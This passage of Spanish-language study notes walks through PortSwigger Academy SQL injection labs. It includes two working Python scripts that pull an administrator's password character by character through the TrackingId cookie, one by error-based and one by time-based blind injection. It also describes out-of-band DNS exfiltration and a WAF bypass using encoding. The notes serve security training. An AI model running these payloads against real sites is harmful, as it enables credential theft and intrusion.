           "session":"BxDP0IK3hLRlZfGdE1T0ouusoTgRJaOb"}


def sqlInyection():

    data = ""

    p1 = log.progress("Fuerza Bruta")
    p2 = log.progress("Data")

    for position in range(1, 30):
        for character in characters:
            payload = "22ma4YcnySi5y3a8'||(select case when substr(password,%d,1)='%s' then to_char(1/0) else '' end from users where username='administrator')||'" % (position, character)
            cookies['TrackingId'] = payload

            p1.status(payload)

            r = requests.get(main_url, cookies=cookies)

            if r.status_code == 500:
                data+=character
                p2.status(data)
                break



def main():
    sqlInyection()


if __name__ == '__main__':
    main()
```
Ese es el script que implementamos y que una ves lo usemos podremos ver la contraseña de forma correcta:
![[Pasted image 20250903193649.png]]

la contraseña es correcta los % no son parte de ella vamos a probar si con esto completamos el Lab:
![[Pasted image 20250903194112.png]]
Vemos que logramos completar la lab.

### Visible error-based SQL injection

![[Pasted image 20250904160153.png]]
Lo que podemos observar es como los errores que provocan la comilla son visibles y el propósito será aprovecharnos de eso.

Lo primero que podemos hacer es ver si es posible hacer cosas como convertir un tipo de dato y eso igualarlo formando una igualdad, el propósito es que de sea verdadero y logremos no ver ningún error, algo que se suele usar es `cast()` que nos permite convertir un tipo de dato a otro y lo aprovechamos de la siguiente manera:

![[Pasted image 20250905092145.png]]
vemos que convertimos un uno en entero y lo igualamos y esto es valido, con esto posible ahora podemos intentar lo siguiente:

![[Pasted image 20250905092431.png]]
Lo que estamos viendo es que primero tuvimos un error de longitud donde no se admitían mas de 95 caracteres, es por eso que eliminamos el valor del `TrackinId` con el propósito de ahorrar espacio e inyectar el comando, en este punto por la limitación de caracteres no podemos hacer mucho pero lo que hace la base de datos es por ejemplo a través del error decir yo no puedo convertir el valor de `administrator` en un entero, lo que nos filtra diferentes tipo de valores y es por eso que nosotros el punto siempre será acontecer un error critico que nos filtre información.

Ya con esto vamos a ver el password:
![[Pasted image 20250905093210.png]]
y con eso ya podemos completar el LAB:
![[Pasted image 20250905093315.png]]
Lab Terminado:

### Lab: Blind SQL injection with time delays

En este caso el propósito es identificar que tipo de inyección dependiendo de la ase de dato por lo tanto lo que vamos a hacer es intentar diferentes hasta que lo logremos:
![[Pasted image 20250905095343.png]]
Es al parecer una `posgresSQL` por lo que no jugamos como en `mySQL` con un and sino con un los pipes para concatenar las query.

El objetivo es que cargue o se demore 10 segundos en cargar y con esto lo logramos Lab Terminada.

### Lab: Blind SQL injection with time delays and information retrieval

En el lab anterior logramos ver como nosotros logramos en `posgresSQL` realizar una inyección por medio de los pipes, con esto en mente lo que se va a realizar es algo parecido y es que vamos a realizar otras petición esto separando las peticiones con `;` tomando en cuenta que si los mandamos tal cual provocara un error ya que la petición pensara que estamos separando no la query si no el mismo campo de cookie por lo que lo vamos a usar para separa pero url-encoding para que funcione que es `%3b` que nos lo tomara como parte de la query y si funcionara:
![[Pasted image 20250905101844.png]]

En este punto lo mejor es volver a jugar con `case` para identificar igualdades de la siguiente manera:

![[Pasted image 20250905102225.png]]
Ahora esto funciona y como conocemos la tabla `users` y la columna `password y username` podemos intentar primero hacer lo siguiente:
![[Pasted image 20250905102340.png]]
El valor administrator es valido por lo que entra al sleep(5) y logramos saver que existe, tomando en cuenta que funciona podemos hacer lo mismo para la contraseña de la siguiente manera:

![[Pasted image 20250905102939.png]]
Vemos como es la comparativa que no es complicada y en este caso tenemos que hacer el proceso un poco manual dado que el intruder en mi caso no detecto tiempos de respuesta, con esto logramos obtener el primer valor que en mi caso es f.

Con esto claro vamos a crear un script en python que nos permite obtener el valor de la password:

```python
#!/usr/bin/python3

from pwn import *
import signal, requests, time, sys, string


#CTRL_C
def def_handler(sing, frame):
    print("\n\n[+] Saliendo......\n\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

main_url="https://0afe00f104b1cefd8156617500880084.web-security-academy.net"
cookies = {"TrackingId":"","session":"bsAVaHEqGgJg89Wias6s4CNkLCCBZbYm"}
characters = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_-"


def sqlInyection():

    password=""

    p1 = log.progress("Brute Force")
    p2 = log.progress("Password")

    for position in range(1, 21):
        for character in characters:
            payload = f"rNYa6jZQ7xn04pAB'%3b select case when(username='administrator' and substring(password,{position},1)='{character}') then pg_sleep(3) else pg_sleep(0) end from users-- -"
            cookies['TrackingId'] = payload

            p1.status(payload)

            r = requests.get(main_url, cookies=cookies)

            if r.elapsed.total_seconds() > 3: # r.elapsed.total_secods es mejor que jugar com time.time() para sacar el tiempo de respuesta de la petición.
                password+=character
                p2.status(password)
                break

def main():
    sqlInyection()



if __name__ == '__main__':
    main()

```

![[Pasted image 20250905112926.png]]

Ya con esto vemos la password y podemos usarla para iniciar sesión.
![[Pasted image 20250905112937.png]]
Lab Terminado.

Algo extra es que en `mySQL` cambia la sintaxis y seria algo parecido a lo siguiente:
![[Pasted image 20250905112527.png]]

En el caso de comencemos a filtrar información jugamos con nested query de la siguiente manera:
![[Pasted image 20250905112610.png]]

y esto ya seria cuestión de practicar e investigar.

### Lab: Blind SQL injection with out-of-band interaction

La vulnerabilidad reside en la cookie ‘**TrackingId**‘, que es inyectada en una consulta SQL. Aprovechamos esta situación para insertar un payload que provoca una resolución DNS hacia un dominio controlado, utilizando la funcionalidad de Burp Collaborator.

Combinamos la inyección SQL con una entidad externa en XML (**XXE**) que genera una solicitud automática a un subdominio de Collaborator, confirmando así que la inyección fue ejecutada aunque no haya evidencia directa en la respuesta HTTP.

![[Pasted image 20250905115352.png]]
La inyección es solo sacada del CheetSheet de PortSwigger y usando el collaborator de BurpSuite podemos  para cambiar el sentido de la petición y eso seria todo, el objetivo de la maquina es permitirnos ver como mediante 

### Lab: SQL injection with filter bypass via XML encoding

![[Pasted image 20250905154624.png]]
Como podemos ver en este caso la inyección es en una petición por post la cual tramita una estructura XML donde podemos intentar usar comillas en los campos a ver que sucede:

![[Pasted image 20250905154736.png]]
De alguna forma nos dice que se detecto el ataque y lo mismo en el otro campo.

En este punto lo que vamos a intentar son diferentes inyecciones en estos campos sin comentar las query y sin comillas , el punto es intentar de todo, pero en este caso lo valido de seria lo que dijimos por lo que vamos a ver que sucedió:

![[Pasted image 20250905154954.png]]
Vemos que tenemos una posible inyección dentro de este campo y mediante un order vemos que logramos ver los productos válidos.

en este punto lo que vamos a intentar es escalar al `union attack`:
![[Pasted image 20250905155220.png]]

Vemos que nos pone ataque detectado por lo que ya nos hace pensar que tenemos un WAF por detrás corriendo, por lo que vamos a intentar evitar la detección de la inyección es de la siguiente manera:
![[Pasted image 20250905155630.png]]
Para esto se uso la extension de Hackventor de burp suite que nos ayuda a representar de forma distinta el texto ya que al parecer filtra por palabras de posibles ataques, se uso el encode y hex entity de hackvector para eso

En este punto ya podemos intentar realizar el ataque de Inyección sql:
![[Pasted image 20250905155832.png]]

Ya vemos las bases de datos y a partir de aquí es lo que ya conocemos:
![[Pasted image 20250905155928.png]]

![[Pasted image 20250905155958.png]]

![[Pasted image 20250905160100.png]]

![[Pasted image 20250905160148.png]]

![[Pasted image 20250905160208.png]]
Lab Terminado.

